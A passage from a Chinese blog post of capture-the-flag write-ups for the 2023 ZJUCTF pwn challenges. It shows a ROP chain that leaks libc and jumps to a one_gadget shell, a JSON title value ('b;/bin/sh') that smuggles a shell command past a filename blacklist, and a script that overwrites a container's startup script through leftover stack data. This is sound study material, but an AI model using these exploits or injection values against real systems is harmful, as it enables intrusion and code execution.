20218)</span></span><br><span class="line">p = process(<span class="string">"./game"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./game"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bof</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">"row:"</span>, <span class="string">b"-6"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"col:"</span>, <span class="string">b"-1"</span>)</span><br><span class="line"></span><br><span class="line">bof()</span><br><span class="line">padding = <span class="string">b"A"</span> * (<span class="number">256</span> + <span class="number">8</span>)</span><br><span class="line">payload = <span class="string">b"A"</span> * (<span class="number">256</span> + <span class="number">8</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"name:"</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(payload)</span><br><span class="line"></span><br><span class="line">win_ret = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">p.info(<span class="built_in">hex</span>(win_ret))</span><br><span class="line"><span class="comment"># 0000000000001D2D</span></span><br><span class="line">win_ret_offset = <span class="number">0x1d2d</span></span><br><span class="line">win_game_offset = <span class="number">0x1384</span></span><br><span class="line"></span><br><span class="line">offset = win_ret_offset - win_game_offset</span><br><span class="line"></span><br><span class="line">win_game = win_ret - offset</span><br><span class="line">base = win_game - win_game_offset</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b"Y"</span>)</span><br><span class="line"></span><br><span class="line">bof()</span><br><span class="line"></span><br><span class="line">put_plt = base + elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">put_got = base + elf.got[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi = base + <span class="number">0x0000000000001db3</span></span><br><span class="line"></span><br><span class="line">payload = padding + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(win_game)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"again?"</span>, <span class="string">b"Y"</span>)</span><br><span class="line">p.recvuntil(<span class="string">b"\n"</span>)</span><br><span class="line">put_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b"\x00"</span>))</span><br><span class="line">base_addr = put_addr - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">p.info(<span class="built_in">hex</span>(base_addr))</span><br><span class="line">one_gadget = base_addr + <span class="number">0xe3b01</span></span><br><span class="line"><span class="comment"># 0xe3afe execve("/bin/sh", r15, r12)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="comment">#   [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 0xe3b01 execve("/bin/sh", r15, rdx)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="comment">#   [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 0xe3b04 execve("/bin/sh", rsi, rdx)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="comment">#   [rdx] == NULL || rdx == NULL</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = padding + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b"Y"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h3 id="1-5-logger">1.5 logger</h3>
<p>好烦的一道题，做了好久，最后还是在求助下完成的（虽然被标是trivial难度的…）</p>
<p>直接给了源码，好好好。是一个Json字符串解析的程序。</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">............(上面还有好多行)</span><br><span class="line"><span class="type">void</span> <span class="title function_">handler</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    json_object *jobj;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint8_t</span> jbuf[<span class="number">512</span>] = {<span class="number">0</span>};</span><br><span class="line">    <span class="type">uint8_t</span> sbuf[NAME_MAX] = {<span class="number">0</span>};</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; COUNT; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"remain chance: 0x%x\n"</span>, i);</span><br><span class="line">        <span class="comment">/* 1. get user input via json str */</span></span><br><span class="line">        read_wrap(jbuf, <span class="number">512</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 2. parse it */</span></span><br><span class="line">        jobj = json_tokener_parse(jbuf);</span><br><span class="line">        <span class="keyword">if</span> (!jobj || !json_object_is_type(jobj, json_type_object))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"bad format log, try again\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        internal_handler(jobj, sbuf);</span><br><span class="line"></span><br><span class="line">        json_object_put(jobj);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(jbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(jbuf));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">{</span><br><span class="line">    prepare();</span><br><span class="line">    handler();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>输入一个Json字符串，程序会分成员进行解析。如果检测无误，就会调用wrapper执行<code>touch</code>指令去创建一个以<code>title</code>中字符串为名的文件。在这之前，程序还会检测<code>title</code>中的成分，保证不含有恶意字符。</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">file_name_check</span><span class="params">(<span class="type">char</span> *filename, <span class="type">int</span> checklen)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (checklen &gt;= NAME_MAX - <span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        error_exit(STRICT);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; checklen; i++)</span><br><span class="line">    {</span><br><span class="line">        <span class="type">char</span> tmp = filename[i];</span><br><span class="line">        <span class="keyword">if</span> (tmp == <span class="string">';'</span> || tmp == <span class="string">'&amp;'</span> || tmp == <span class="string">'|'</span> || tmp == <span class="string">'&gt;'</span> || tmp == <span class="string">'&lt;'</span> ||</span><br><span class="line">            tmp == <span class="string">'`'</span> || tmp == <span class="string">'$'</span> || tmp == <span class="string">'!'</span> || tmp == <span class="string">'('</span> || tmp == <span class="string">'('</span> ||</span><br><span class="line">            tmp == <span class="string">'"'</span> || tmp == <span class="string">"\'"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_touch_wrap</span><span class="params">(<span class="type">char</span> *filename)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    <span class="type">char</span> *cmd;</span><br><span class="line"></span><br><span class="line">    size = <span class="built_in">strlen</span>(filename) + <span class="number">16</span>;</span><br><span class="line">    cmd = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">memset</span>(cmd, <span class="number">0</span>, size);</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">"touch %s"</span>, filename);</span><br><span class="line">    system(cmd);</span><br><span class="line">    <span class="built_in">free</span>(cmd);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>OK，目标明确——绕过检测，只要能执行<code>touch **;cat flag</code>就行。</p>
<p>有一个切入点，<code>file_name_check</code>是根据title的长度进行检测的，长度以外的东西检测不到，但同样被输入到cmd中。</p>
<p>看了下输入的函数，由于我们要输入标准格式的Json字符串，所以没办法用00截断。</p>
<p>很有意思的一点，这道题中xor_handler没有对数组进行memset，也就是说，我们上一次输入的数据，在下一次输入时仍然存在原地，即便先前输入的东西过不了check。</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">o_xor_handler</span><span class="params">(<span class="type">uint8_t</span> *title, <span class="type">uint8_t</span> *data, <span class="type">char</span> *stackbuf)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *filenamebuf = stackbuf;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> titlesize = <span class="built_in">strlen</span>(title);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!file_name_check(filenamebuf, titlesize))</span><br><span class="line">    {</span><br><span class="line">        error_exit(STRICT);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    do_touch_wrap(filenamebuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the output, xor</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(data); i++)</span><br><span class="line">    {</span><br><span class="line">        data[i] ^= XOR_OUT_KEY;</span><br><span class="line">    }</span><br><span class="line">	<span class="comment">/*没有memset*/</span></span><br><span class="line">    b64_enc(data, data, <span class="built_in">strlen</span>(data));</span><br><span class="line">    fd = open(filenamebuf, O_WRONLY);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    write(fd, data, <span class="built_in">strlen</span>(data));</span><br><span class="line">    close(fd);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
<p>好嘞，那就没有任何问题了，直接写EXP打：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment"># p = remote("ctfenv.zjusec.net", 23192)</span></span><br><span class="line">p = process(<span class="string">"./app"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"chance:"</span>, <span class="string">b"{\"flag\": 262145 ,\"title\":\"b;/bin/sh\",\"data\":\"dddddddd\"}"</span>.ljust(<span class="number">513</span>,<span class="string">b"\x00"</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"chance:"</span>, <span class="string">b"{\'flag\': 65537 ,\'title\':\'b\',\'data\':\'dddddddd\'}"</span>.ljust(<span class="number">513</span>, <span class="string">b"\x00"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>需要注意的两点：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>本题的输入函数是需要读满512个字节，所以需要对输入的payload进行00补全</p>
</li>
<li class="lvl-2">
<p>这里的flag其实的以掩码形式存在的，在程序内会被转化成1,2,4,8等。之前没注意到，在这卡了好半天。</p>
</li>
</ul>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ((get_out_mask(l_flag)))</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">case</span> PLAIN_E_BIT:</span><br><span class="line">        o_plain_handler(l_title, deced_buf, stackbuf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BASE32_E_BIT:</span><br><span class="line">        o_base32_handler(l_title, deced_buf, stackbuf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> BASE64_E_BIT:</span><br><span class="line">        o_base64_handler(l_title, deced_buf, stackbuf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> XOR_E_BIT:</span><br><span class="line">        o_xor_handler(l_title, deced_buf, stackbuf);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br></pre></td></tr></table></figure></div>
<p>成功get shell：</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125001600696.png" alt="image-20231125001600696"></p>
<h3 id="1-6-drawer">1.6 drawer</h3>
<p>做的很吐血的一道pwn题，还学了一下Docker容器。在本地没有办法模拟，就说一下思路叭。</p>
<p>开局直接给了docker的配置：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string">|--start.sh</span></span><br><span class="line"><span class="string">|--log.sh</span></span><br><span class="line"><span class="string">|--Docker</span></span><br><span class="line"><span class="string">|--drawer.elf</span></span><br></pre></td></tr></table></figure>
<p>查看Docker文件，其实看不太懂，<a target="_blank" rel="noopener" href="http://xn--start-rt2hhkt11ecig8rnnwnhy3hvoua.sh">但大意就是会运行start.sh</a></p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125002630022.png" alt="image-20231125002630022"></p>
<p>而start.sh是程序的启动脚本。不管这些，看程序先：</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125004134370.png" alt="image-20231125004134370"></p>
<p>菜单？堆题？再仔细看看，好像不是。</p>
<p>程序实现了一个简单的画画的功能。</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>new函数：输入长和宽，在堆中分配一段空间，空间大小为长乘宽</p>
</li>
<li class="lvl-2">
<p>draw函数：在刚刚分配的空间内输入内容</p>
</li>
<li class="lvl-2">
<p>preview函数：用于输出刚才输入的内容</p>
</li>
<li class="lvl-2">
<p>save函数：输入一个1byte长度的字符，以它作为 名字打开或新建一个文件，并把刚才输入的内容写入。</p>
</li>
</ul>
<p>save函数如下：</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125123440945.png" alt="image-20231125123440945"></p>
<p>可以看到它在创建了一个8bytes的filename数组后并没有memset将其置0，而是直接输入。</p>
<p>OK，那就有思路了，我们可以利用栈上存留的脏数据，让<code>filename=start.sh</code>，从而修改启动脚本中的代码。由于容器不会被销毁，则第一次运行之后的结果在下次运行时仍然保留。即下次运行时的启动脚本，就是我们修改之后的了。</p>
<p>至于怎么把脏数据布置到栈上嘛，当然要请另外几个函数帮忙啦~</p>
<p><strong>正片开始：</strong></p>
<p>首先，利用new函数和draw函数把我们需要的东西输进去。</p>
<p>（start.sh原本的内容+cat flag）</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content = <span class="string">"#!/bin/sh\ncat flag;\n/etc/init.d/xinetd start;\nsleep infinity;"</span></span><br></pre></td></tr></table></figure></div>
<p>在save函数里，filename的栈地址为rbp-0x10 。需要明确，main函数中调用的函数所创建的新的函数栈，<strong>rsp可能会有所变化但rbp一定不变。</strong></p>
<p>在preview函数中有rbp-0x10地址的变量，并且可以输入，并且的<code>long unsigend</code>类型。（<code>long unsigned</code>类型数据是8bytes的）可以利用。</p>
<p>但要注意，由于我们输入的是一个整形数，所以我们需要将<code>start.sh</code>字符串转化为整形数。（ASCII码值，小端规则）打进栈中。</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idx = <span class="built_in">int</span>.from_bytes(<span class="string">b"start.sh"</span>, byteorder=<span class="string">"little"</span>)</span><br></pre></td></tr></table></figure></div>
<p>接下来是save函数。</p>
<p><img src="/2023/11/25/ZJUCTF-Pwn-Partial/ZJUCTF-Pwn-Partial%5Cimage-20231125124811814.png" alt="image-20231125124811814"></p>
<p>用<code>scanf</code>函数输入字符串，会自动在它后面加一个<code>0x00</code>用于截断，但是我们的栈都布置好了，它一截断破坏栈结构。</p>
<p>重点来了！在<code>isoc99_scanf</code>的源码中，如果其收到了<code>EOF</code>信号会直接跳出来，不做任何输入。所以，在这里我们直接把与容器的链接<code>shutdown</code>，<code>isoc99_scanf</code>会收到<code>EOF</code>被跳过，如此一来我们就可以顺利写入啦~</p>
<p>再次<code>nc</code>容器，就能直接把flag cat出来。</p>
<p>EXP：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="keyword">import</span> tty</span><br><span class="line">p = remote(<span class="string">"ctfenv.zjusec.net"</span>, <span class="number">33898</span>)</span><br><span class="line"><span class="comment"># p = process("./drawer")</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,width,length</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"width:"</span>, <span class="built_in">str</span>(width))</span><br><span class="line">    p.sendlineafter(<span class="string">"height:"</span>, <span class="built_in">str</span>(length))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"input pixel: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">preview</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save</span>(<span class="params">name, index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;"</span>, <span class="string">'4'</span>)</span><br><span class="line">    <span class="comment"># p.sendlineafter("name: ", 's' + chr(tty.CEOF))</span></span><br><span class="line">    <span class="comment"># p.sendlineafter("which picture? ", str(index))</span></span><br><span class="line">    p.recv()</span><br><span class="line">    p.shutdown()</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="string">"#!/bin/sh\ncat flag;\n/etc/init.d/xinetd start;\nsleep infinity;"</span></span><br><span class="line">draw(<span class="number">0</span>, content)</span><br><span class="line"></span><br><span class="line">idx = <span class="built_in">int</span>.from_bytes(<span class="string">b"start.sh"</span>, byteorder=<span class="string">"little"</span>)</span><br><span class="line"></span><br><span class="line">preview(idx)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">save(<span class="string">'s'</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># 7526410479936304243</span></span><br><span class="line">p = remote(<span class="string">"ctfenv.zjusec.net"</span>, <span class="number">33898</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>就这些了，剩下的就没做出来了呜呜呜，还是太菜，继续练~</p>

      
    </div>
    
      <footer class="article-footer">
        完
      </footer>
    
  </div>
  
    
<nav id="article-nav">
  <div class="article-nav-block">
    
  </div>
  <div class="article-nav-block">
    
      <a href="/2023/11/24/Shamir%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/" id="article-nav-older" class="article-nav-link-wrap">
        <div class="article-nav-title">Secret Sharing —— 秘密共享</div>
        <strong class="article-nav-caption"></strong>
      </a>
    
  </div>
</nav>

    <link rel="stylesheet" href="/css/gitment.css"> 
<script src="/js/gitment.js"></script>

<div id="gitmentContainer"></div>

<script>
var gitment = new Gitment({
  owner: '',
  repo: '',
  oauth: {
    client_id: '',
    client_secret: '',
  },
})
gitment.render('gitmentContainer')
</script>

  
  
</article>
</section>
        <aside id="sidebar">
  
    <div class="widget-box">
  <div class="avatar-box">
    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
    <h3 class="avatar-name">
      
        晚栀
      
    </h3>
    <p class="avatar-slogan">
      陈笛垂案闻孤馆，抚琴靠海坐凭栏。风吹春困不觉晚，人间好梦寄青山。
    </p>
  </div>
</div>


  
    

  
    
  <div class="widget-box">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ZJUCTF/" rel="tag">ZJUCTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" rel="tag">数学建模</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FII/" rel="tag">计算机系统II</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-box">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
    </div>
  </div>

  
    
  <div class="widget-box">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/11/25/ZJUCTF-Pwn-Partial/">2023-ZJUCTF-Pwn(Partial)</a>
          </li>
        
          <li>
            <a href="/2023/11/24/Shamir%E7%A7%98%E5%AF%86%E5%85%B1%E4%BA%AB/">Secret Sharing —— 秘密共享</a>
          </li>
        
          <li>
            <a href="/2023/11/22/Computer-System-II-Lab-2-%EF%BC%9AForwarding-%E5%8F%8A-AXI4-lite-%E6%80%BB%E7%BA%BF%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/">Computer System II Lab2 ：Forwarding 及 AXI4-lite 总线内存模型</a>
          </li>
        
          <li>
            <a href="/2023/11/22/Computer-System-II-Lab1-%EF%BC%9A%E5%9F%BA%E4%BA%8EStall%E7%9A%84%E4%BA%94%E7%BA%A7%E6%B5%81%E6%B0%B4%E7%BA%BF/">Computer System II Lab1 ：基于Stall的五级流水线</a>
          </li>
        
      </ul>
    </div>
  </div>

  
      <div class="widget-box">
    <h3 class="widget-title">友链</h3>
    <div class="widget">
      
        <a style="display: block;" href="https://note.jiepeng.tech/" title target='_blank'
        >JPGG&#39;s NoteBook</a>
      
        <a style="display: block;" href="http://tauhkc.cn/" title target='_blank'
        >Tauhkc&#39;s Note</a>
      
        <a style="display: block;" href="https://xymmsnotebook.gitbook.io/noteofxymm/" title target='_blank'
        >xy猫猫</a>
      
        <a style="display: block;" href="https://hzeroyuke.github.io/my_blog/" title target='_blank'
        >华零的Note</a>
      
    </div>
  </div>

  
</aside>
      </div>
      <footer id="footer">
  <div class="foot-box global-width">
    &copy; 2023 晚栀wingee~ &nbsp;&nbsp;
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    &nbsp;|&nbsp;主题 <a target="_blank" rel="noopener" href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
    <br>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
  </div>
</footer>
      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
<script>
if (!window.jQuery) {
var script = document.createElement('script');
script.src = "/js/jquery-2.0.3.min.js";
document.body.write(script);
}
</script>

  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>





